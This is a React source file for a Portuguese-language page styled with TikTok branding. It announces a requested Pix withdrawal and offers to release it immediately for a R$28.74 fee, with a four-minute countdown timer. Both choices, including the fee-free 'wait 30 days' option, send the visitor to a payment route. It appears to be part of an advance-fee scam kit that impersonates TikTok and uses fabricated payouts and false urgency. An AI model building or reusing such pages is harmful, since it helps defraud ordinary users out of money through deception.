import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Check, Zap, Calendar, CreditCard, ArrowRight, Clock, X } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";

const FONT = "Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif";
const RED = "#FE2B54";
const UPSELL_TAX = 28.74;

const Upsell = () => {
  const [selected, setSelected] = useState<"antecipar" | "aguardar">("antecipar");
  const [countdown, setCountdown] = useState(4 * 60);
  const navigate = useNavigate();

  useEffect(() => {
    trackTikTokEvent({ event: "ViewContent", properties: { page: "upsell1", content_type: "upsell" } });
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const mins = String(Math.floor(countdown / 60)).padStart(2, "0");
  const secs = String(countdown % 60).padStart(2, "0");

  const handleAntecipar = () => {
    trackTikTokEvent({ event: "InitiateCheckout", properties: { page: "upsell1", value: UPSELL_TAX } });
    navigate("/pagamento");
  };

  const handleAguardar = () => {
    navigate("/pagamento");
  };

  return (
    <div style={{ fontFamily: FONT, background: "#F5F5F5", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <div style={{ width: "100%", background: "#fff", padding: "14px 0", borderBottom: "1px solid #eee", display: "flex", justifyContent: "center", alignItems: "center", position: "sticky", top: 0, zIndex: 100 }}>
        <img src={tiktokLogo} alt="TikTok" style={{ height: 22 }} loading="eager" decoding="async" />
      </div>

      {/* Container */}
      <div style={{ maxWidth: 449, margin: "0 auto", padding: "16px 12px 110px", flex: 1, width: "100%" }}>
        <div style={{ background: "#fff", borderRadius: 12, padding: "24px 20px", boxShadow: "0 1px 18.4px rgba(0,0,0,0.03)", textAlign: "center" }}>

          {/* Status icon */}
          <div style={{ width: 56, height: 56, background: "#10B981", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px" }}>
            <Check size={26} color="#fff" strokeWidth={3} />
          </div>

          <h1 style={{ color: "#000", fontSize: 20, fontWeight: 700, marginBottom: 10 }}>
            Saque Solicitado!
          </h1>
          <p style={{ fontSize: 14, color: "#666", lineHeight: 1.5, marginBottom: 20 }}>
            Saque solicitado com sucesso! Seu saque será enviado em <strong style={{ color: "#000", fontWeight: 600 }}>30 dias</strong> para a chave Pix cadastrada.
          </p>

          {/* Escolha */}
          <div style={{ background: "#F8F9FB", borderRadius: 12, padding: 16, margin: "16px 0", border: "1px solid #F1F1F3" }}>
            <p style={{ fontSize: 15, fontWeight: 600, color: "#000", marginBottom: 14, textAlign: "center" }}>
              Como deseja receber?
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
              {/* Opção Antecipar */}
              <button
                onClick={() => setSelected("antecipar")}
                style={{
                  padding: "16px 14px",
                  borderRadius: 10,
                  textAlign: "left",
                  background: selected === "antecipar" ? "#FFF0F3" : "#fff",
                  border: selected === "antecipar" ? `2px solid ${RED}` : "2px solid #F1F1F3",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "flex-start",
                  gap: 12,
                  fontFamily: FONT,
                  transition: "all 0.2s",
                }}
              >
                <div style={{
                  width: 38, height: 38,
                  background: selected === "antecipar" ? RED : "#F1F1F3",
                  borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
                }}>
                  <Zap size={17} color={selected === "antecipar" ? "#fff" : "#999"} />
                </div>
                <div style={{ flex: 1 }}>
                  <div style={{ display: "flex", alignItems: "center", marginBottom: 6 }}>
                    <span style={{ fontSize: 14, fontWeight: 600, color: "#000" }}>Receber Agora</span>
                    <span style={{ background: RED, color: "#fff", padding: "3px 7px", borderRadius: 99, fontSize: 10, fontWeight: 600, marginLeft: 8 }}>RECOMENDADO</span>
                  </div>
                  <p style={{ fontSize: 12, color: "#848286", lineHeight: 1.4, marginBottom: 6 }}>
                    Antecipe seu saque e receba imediatamente via Pix
                  </p>
                  <p style={{ fontSize: 16, fontWeight: 700, color: RED, margin: "6px 0 0" }}>
                    Taxa: R$ {UPSELL_TAX.toFixed(2).replace(".", ",")}
                  </p>
                  <ul style={{ marginTop: 10, padding: 0, listStyle: "none" }}>
                    <li style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 5, fontSize: 11, color: "#666" }}>
                      <Check size={11} color="#10B981" /> Dinheiro na conta em segundos
                    </li>
                    <li style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 11, color: "#666" }}>
                      <Check size={11} color="#10B981" /> Prioridade em campanhas TikTok
                    </li>
                  </ul>
                </div>
              </button>

              {/* Opção Aguardar */}
              <button
                onClick={() => setSelected("aguardar")}
                style={{
                  padding: "16px 14px",
                  borderRadius: 10,
                  textAlign: "left",
                  background: selected === "aguardar" ? "#FFF0F3" : "#fff",
                  border: selected === "aguardar" ? `2px solid ${RED}` : "2px solid #F1F1F3",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "flex-start",
                  gap: 12,
                  fontFamily: FONT,
                  transition: "all 0.2s",
                }}
              >
                <div style={{
                  width: 38, height: 38,
                  background: selected === "aguardar" ? RED : "#F1F1F3",
                  borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
                }}>
                  <Calendar size={17} color={selected === "aguardar" ? "#fff" : "#999"} />
                </div>
                <div style={{ flex: 1 }}>
                  <div style={{ marginBottom: 6 }}>
                    <span style={{ fontSize: 14, fontWeight: 600, color: "#000" }}>Aguardar 30 Dias</span>
                  </div>
                  <p style={{ fontSize: 12, color: "#848286", lineHeight: 1.4, marginBottom: 6 }}>
                    Processamento padrão sem taxa adicional
                  </p>
                  <ul style={{ marginTop: 10, padding: 0, listStyle: "none" }}>
                    <li style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 5, fontSize: 11, color: "#666" }}>
                      <X size={11} color="#ff4444" /> 30 dias de espera pelo dinheiro
                    </li>
                    <li style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 11, color: "#666" }}>
                      <X size={11} color="#ff4444" /> Sem acesso ao valor por 1 mês
                    </li>
                  </ul>
                </div>
              </button>
            </div>
          </div>

          {/* CTA Buttons */}
          {selected === "antecipar" ? (
            <button
              onClick={handleAntecipar}
              style={{
                width: "100%",
                border: 0,
                borderRadius: 99,
                padding: "16px 24px",
                fontSize: 15,
                fontWeight: 700,
                cursor: "pointer",
                color: "#fff",
                background: RED,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 10,
                boxShadow: "0 4px 16px rgba(254,43,84,0.25)",
                margin: "16px 0 12px",
                fontFamily: FONT,
              }}
            >
              <CreditCard size={17} />
              QUERO RECEBER AGORA - R$ {UPSELL_TAX.toFixed(2).replace(".", ",")}
            </button>
          ) : (
            <button
              onClick={handleAguardar}
              style={{
                width: "100%",
                border: "2px solid #F1F1F3",
                borderRadius: 99,
                padding: "14px 24px",
                fontSize: 14,
                fontWeight: 600,
                cursor: "pointer",
                color: "#848286",
                background: "#fff",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 10,
                margin: "16px 0 12px",
                fontFamily: FONT,
              }}
            >
              <ArrowRight size={17} />
              CONTINUAR - AGUARDAR 30 DIAS
            </button>
          )}

          {/* Timer */}
          <div style={{ textAlign: "center", fontSize: 12, color: "#848286", fontWeight: 500, background: "#F8F9FB", padding: "8px 12px", borderRadius: 8, border: "1px solid #F1F1F3", display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
            <Clock size={13} />
            Oferta disponível por: <span style={{ color: RED, fontWeight: 700 }}>{mins}:{secs}</span>
          </div>

          {/* Footer */}
          <p style={{ textAlign: "center", fontSize: 11, color: "#848286", marginTop: 14, lineHeight: 1.4 }}>
            Escolha opcional. Caso não antecipe, seu saque será processado normalmente em 30 dias úteis.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Upsell;
